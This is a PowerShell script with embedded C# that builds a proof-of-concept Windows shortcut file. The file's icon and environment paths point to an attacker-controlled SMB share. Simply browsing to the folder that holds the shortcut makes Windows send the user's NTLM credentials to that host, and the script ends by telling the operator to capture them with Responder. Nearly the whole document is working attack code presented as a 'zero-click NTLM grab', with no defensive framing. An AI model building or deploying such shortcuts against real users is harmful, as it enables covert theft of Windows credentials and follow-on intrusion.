<#
Make‑Lnk.ps1  –  Build a zero‑click NTLM‑leaking shortcut from PowerShell/C# v4
#>

$lnkPath  = "poc.lnk"
$iconPath = "\\\\192.168.254.43\\evilshare\\test.exe,0"
$envUNC   = "\\\\192.168.254.43\\evilshare\\test.exe"
$desc     = "NTLM grab"

$src = @"
using System;
using System.IO;
using System.Runtime.InteropServices;
public class LnkBuilder {
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct SHELL_LINK_HEADER {
        public uint HeaderSize; public uint CLSID1; public ushort CLSID2; public ushort CLSID3;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)] public byte[] CLSID4;
        public uint Flags; public uint FileAttrs; public long CTime; public long ATime; public long WTime;
        public uint FileSize; public uint IconIndex; public uint ShowCmd; public ushort HotKey;
        public ushort Reserved1; public uint Reserved2; public uint Reserved3;
    }
    const uint HAS_NAME=0x4, HAS_ARGS=0x20, HAS_ICON=0x40, IS_UNICODE=0x80, HAS_EXP=0x200;
    const uint ENV_SIG = 0xA0000001;
    public static void Build(string path,string icon,string env,string desc){
        using(var fs=new FileStream(path,FileMode.Create,FileAccess.Write))
        using(var bw=new BinaryWriter(fs)){
            var h=new SHELL_LINK_HEADER{
                HeaderSize=0x4C,CLSID1=0x00021401,CLSID4=new byte[]{0xC0,0,0,0,0,0,0,0x46},
                Flags=HAS_NAME|HAS_ARGS|HAS_ICON|IS_UNICODE|HAS_EXP,
                FileAttrs=0x20,CTime=DateTime.Now.ToFileTimeUtc(),
                ATime=DateTime.Now.ToFileTimeUtc(),WTime=DateTime.Now.ToFileTimeUtc(),
                ShowCmd=1
            };
            int sz=Marshal.SizeOf(h);var buf=new byte[sz];var p=Marshal.AllocHGlobal(sz);
            Marshal.StructureToPtr(h,p,true);Marshal.Copy(p,buf,0,sz);Marshal.FreeHGlobal(p);bw.Write(buf);

            WriteUni(bw,desc);                         // description
            bw.Write((ushort)900); bw.Write(new string(' ',900).ToCharArray()); // cmd filler

            WriteAnsi(bw,icon);                       // IconLocation ANSI
            WriteUniWithNull(bw,icon);                // IconLocation Unicode

            bw.Write(0x00000314u); bw.Write(ENV_SIG); // ENV block
            WriteFixedAnsi(bw,env,260); WriteFixedUni(bw,env,260);
        }
    }
    static void WriteAnsi(BinaryWriter bw,string s){
        var b=System.Text.Encoding.ASCII.GetBytes(s+"\0");
        bw.Write((ushort)b.Length); bw.Write(b);
    }
    static void WriteUni(BinaryWriter bw,string s){
        var b=System.Text.Encoding.Unicode.GetBytes(s);
        bw.Write((ushort)s.Length); bw.Write(b);
    }
    static void WriteUniWithNull(BinaryWriter bw,string s){
        var str=s+"\0"; var b=System.Text.Encoding.Unicode.GetBytes(str);
        bw.Write((ushort)str.Length); bw.Write(b);
    }
    static void WriteFixedAnsi(BinaryWriter bw,string s,int len){
        var b=System.Text.Encoding.ASCII.GetBytes(s); Array.Resize(ref b,len); bw.Write(b);
    }
    static void WriteFixedUni(BinaryWriter bw,string s,int len){
        var b=System.Text.Encoding.Unicode.GetBytes(s); Array.Resize(ref b,len*2); bw.Write(b);
    }
}
"@
Add-Type -TypeDefinition $src -Language CSharp
[LnkBuilder]::Build($lnkPath,$iconPath,$envUNC,$desc)

# sanity‑check
$sc=(New-Object -ComObject WScript.Shell).CreateShortcut("$PWD\$lnkPath")
Write-Host "IconLocation in LNK: $($sc.IconLocation)"
Write-Host "`n[+] poc.lnk created – open the folder and watch Responder"
